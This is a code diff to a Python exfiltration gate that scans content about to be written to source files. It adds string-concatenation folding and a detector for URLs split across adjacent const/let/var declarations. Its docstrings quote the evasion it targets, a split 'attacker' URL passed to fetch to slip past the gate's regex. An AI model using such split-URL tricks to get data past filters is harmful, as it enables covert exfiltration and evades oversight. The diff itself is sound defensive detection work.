@@ -163,6 +163,73 @@ def _scan_network_with_state(content: str) -> list[str]:
     return out
 
 
+_STRING_CONCAT_RE = re.compile(
+    r'(["\'])([^"\'`\\\n]*?)\1\s*\+\s*(["\'])([^"\'`\\\n]*?)\3'
+)
+
+
+def _fold_string_concats(content: str) -> str:
+    """QA-3 Fire 114: attacker splits the URL across a string-concat —
+    `const P1 = "http"; const P2 = "s://attacker/x"; fetch(P1 + P2)` —
+    so neither literal matches the gate's `https?://` regex. At runtime
+    JS coalesces them.
+
+    Pre-fold adjacent `"X" + "Y"` same-quote literals into `"XY"` so
+    the gate's scan runs against the coalesced form. Iterate to convergence
+    to collapse N-way chains (`"a" + "b" + "c"` → `"ab" + "c"` → `"abc"`).
+
+    Does NOT touch backticks (template literals) — those have their own
+    interpolation semantics; a schemeless / concat template literal is a
+    rarer pattern and addressing it requires richer parsing. Tracked as
+    a follow-up if QA-3 probes show the variant.
+
+    Also leaves identifier-concat (`P1 + P2`) alone — can't resolve that
+    without constant-binding analysis. BUT the *declarations* are string
+    literals adjacent in the source; feeding the full source through the
+    existing gate AFTER fold doesn't catch `fetch(P1+P2)` directly. The
+    trick is: the gate also catches an external hostname appearing in a
+    const/var declaration via the hidden-pixel var-ref scan — which we
+    generalize below in _scan_const_url_decl for the Fire 114 shape.
+    """
+    prev = None
+    cur = content
+    while prev != cur:
+        prev = cur
+        cur = _STRING_CONCAT_RE.sub(lambda m: f'{m.group(1)}{m.group(2)}{m.group(4)}{m.group(1)}', cur)
+    return cur
+
+
+def _scan_split_url_declarations(content: str) -> list[str]:
+    """Fire 114: direct detection of the split-URL pattern regardless of
+    constant-folding. Find pairs of adjacent const/let/var declarations
+    where the string literals, concatenated, form an external URL.
+    """
+    out = []
+    # Capture const/let/var <name> = "literal" on each line.
+    decl_re = re.compile(
+        r'(?:const|let|var)\s+(\w+)\s*=\s*["\']([^"\'`\n]*)["\']\s*;?'
+    )
+    decls = [(m.group(1), m.group(2)) for m in decl_re.finditer(content)]
+    # Look at adjacent declarations (by source order) whose values
+    # concatenated would form http(s)://host/... with an external host.
+    for i in range(len(decls) - 1):
+        joined = decls[i][1] + decls[i + 1][1]
+        m = re.match(r'(?:https?:)?//([^/\s]+)', joined)
+        if m and _is_external(_host_of(m.group(1))):
+            out.append(
+                f"split-URL declarations {decls[i][0]} + {decls[i+1][0]} → {_host_of(m.group(1))}"
+            )
+        # 3-way: decls[i] + decls[i+1] + decls[i+2]
+        if i + 2 < len(decls):
+            joined3 = joined + decls[i + 2][1]
+            m3 = re.match(r'(?:https?:)?//([^/\s]+)', joined3)
+            if m3 and _is_external(_host_of(m3.group(1))):
+                out.append(
+                    f"split-URL declarations {decls[i][0]} + {decls[i+1][0]} + {decls[i+2][0]} → {_host_of(m3.group(1))}"
+                )
+    return out
+
+
 def check_outbound_exfil(content: str, filename: str) -> str | None:
     """Return a BLOCKED error string if `content` (the bytes about to be
     written to `filename`) matches an outbound-network exfil pattern.
@@ -175,10 +242,19 @@ def check_outbound_exfil(content: str, filename: str) -> str | None:
     if not name_lower.endswith(_SOURCE_SUFFIXES):
         return None
 
+    # Fire 114: fold `"X" + "Y"` → `"XY"` so the existing regex-based
+    # scans see the coalesced URL even when the source splits it.
+    folded = _fold_string_concats(content)
+
     offenders: list[str] = []
-    offenders.extend(_scan_sendbeacon(content))
-    offenders.extend(_scan_hidden_pixel(content))
-    offenders.extend(_scan_network_with_state(content))
+    offenders.extend(_scan_sendbeacon(folded))
+    offenders.extend(_scan_hidden_pixel(folded))
+    offenders.extend(_scan_network_with_state(folded))
+    # Fire 114: the exact shape is `const P1 = "http"; const P2 = "s://..."`
+    # — two SEPARATE declarations, NOT joined by a `+` in source. Neither
+    # fold nor the main scans catch it. Explicit detector for adjacent
+    # declarations whose values concatenate to an external URL.
+    offenders.extend(_scan_split_url_declarations(content))
 
     if not offenders:
         return None
